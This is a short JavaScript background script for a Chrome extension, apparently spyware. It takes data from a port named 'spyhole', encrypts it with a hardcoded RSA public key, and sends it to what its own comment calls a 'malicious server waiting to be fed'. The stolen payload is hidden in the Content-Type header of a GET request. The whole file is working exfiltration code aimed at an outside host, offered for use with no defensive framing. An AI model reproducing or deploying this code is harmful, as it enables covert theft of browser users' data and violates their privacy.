var method = 'GET';

/***************************************
* malicious server waiting to be fed
* !!!! don't use 127.0.0.1 / localhost !!!!
* Use an external facing IP
*/
var server = 'http://192.168.0.1:8080';
/***************************************/

var pubkey = {
  n: '00be4b951374976ea8390c04158fb8f3093f8b076a31a612ebcdd1e7edd8110e99ab42c94ce25075e9a90c127997a67205d0e7d272caf453a08b3b06b5c5af257034298986a45814f18a3ed657207aea8d5814581144a490c7cf867174f201e14906eb80f00d00da7ca3d19d57d28fcffb5cadfd80fcd8705b828957c310fee960b1ac9457c0f9c61c61dd46b90adcb4084a06a18a2244461372d7352a6cc26dc7aa73fb5f5c7b2d7c966c9d3e42127ab2e409008ebc90c28bbe62f0c108fe4374bdc069419be319e76d4409d3aade61095dfa4f49edc7910f43ef8bcfd31dc6e7d09b162248d2c910c8cc82b4d67902ee04b60503c5e6d1587d0e949f9bcbb313',
  e: '10001'
}

// turn data into something sendable the header accepts
var stringify = function (data){
  var retval = '';
  for (var obj in data) {
    retval += data[obj].toString() + '||';
  }
  //return encodeURI(retval);
  return encrypt(retval);
}

// main message listener
chrome.runtime.onConnect.addListener(function (port){
  if (port.name == 'spyhole'){
    port.onMessage.addListener(function (rcv){
      // port.postMessage({msg: 'BACKGROUND_ACK'});
      sendinfo(stringify(rcv));    
    });
  }
});

// creates http request and sends
var sendinfo = function (info){
  var xhr = new XMLHttpRequest();
  xhr.open(method,server,true);
  xhr.onreadystatechange = function (){
    if (xhr.readyState == 4) {
      // console.log(xhr.responseText);
    }
  }
  xhr.setRequestHeader('Content-Type',info);
  xhr.send();
}

// encrypt payload
var encrypt = function (plaintext){
  var rsa = new RSAKey();
  rsa.setPublic(pubkey.n, pubkey.e);
  return rsa.encrypt(plaintext);
}